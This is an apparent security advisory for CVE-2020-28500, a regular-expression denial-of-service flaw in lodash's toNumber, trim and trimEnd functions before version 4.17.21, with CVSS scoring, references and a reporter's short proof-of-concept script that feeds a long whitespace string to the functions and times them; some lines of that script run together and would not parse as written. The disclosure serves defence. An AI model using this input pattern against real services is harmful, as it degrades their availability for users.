{
    "Title": "Regular Expression Denial of Service (ReDoS) in lodash",
    "Meta": {
        "Package": [
            "lodash([npm](/advisories?query=ecosystem%3Anpm))"
        ],
        "Affected versions": [
            "< 4.17.21"
        ],
        "Patched versions": [
            "4.17.21"
        ]
    },
    "Description": "All versions of package lodash prior to 4.17.21 are vulnerable to Regular\nExpression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd`\nfunctions.\n\nSteps to reproduce (provided by reporter Liyuan Chen):\n\n    \n    \n    var lo = require('lodash');\n    \n    function build_blank(n) {\n        var ret = \"1\"\n        for (var i = 0; i < n; i++) {\n            ret += \" \"\n        }\n        return ret + \"1\";\n    }\n    var s = build_blank(50000) var time0 = Date.now();\n    lo.trim(s) \n    var time_cost0 = Date.now() - time0;\n    console.log(\"time_cost0: \" + time_cost0);\n    var time1 = Date.now();\n    lo.toNumber(s) var time_cost1 = Date.now() - time1;\n    console.log(\"time_cost1: \" + time_cost1);\n    var time2 = Date.now();\n    lo.trimEnd(s);\n    var time_cost2 = Date.now() - time2;\n    console.log(\"time_cost2: \" + time_cost2);\n\n### References\n\n  * <https://nvd.nist.gov/vuln/detail/CVE-2020-28500>\n  * [lodash/lodash#5065](https://github.com/lodash/lodash/pull/5065)\n  * [lodash/lodash@`02906b8`](https://github.com/lodash/lodash/commit/02906b8191d3c100c193fe6f7b27d1c40f200bb7)\n  * <https://github.com/lodash/lodash/blob/npm/trimEnd.js%23L8>\n  * <https://security.netapp.com/advisory/ntap-20210312-0006/>\n  * <https://snyk.io/vuln/SNYK-JS-LODASH-1018905>\n  * <https://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074896>\n  * <https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074894>\n  * <https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074892>\n  * <https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074895>\n  * <https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074893>\n  * <https://www.oracle.com//security-alerts/cpujul2021.html>\n  * <https://www.oracle.com/security-alerts/cpuoct2021.html>\n  * <https://www.oracle.com/security-alerts/cpujan2022.html>\n  * <https://www.oracle.com/security-alerts/cpujul2022.html>\n  * <https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf>\n  * [lodash/lodash@`c4847eb`](https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a)\n\n",
    "Severity": {
        "Score": "5.3/ 10 (Moderate)",
        "CVSS base metrics": {
            "Attack vector": "Network",
            "Attack complexity": "Low",
            "Privileges required": "None",
            "User interaction": "None",
            "Scope": "Unchanged",
            "Confidentiality": "None",
            "Integrity": "None",
            "Availability": "Low"
        },
        "CVSS string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
    },
    "Weaknesses": [
        "[CWE-400](/advisories?query=cwe%3A400)",
        "[CWE-1333](/advisories?query=cwe%3A1333)"
    ],
    "CVE ID": "CVE-2020-28500",
    "GHSA ID": "GHSA-29mw-wpgm-hmr9",
    "Source code": "[lodash/lodash](https://github.com/lodash/lodash)"
}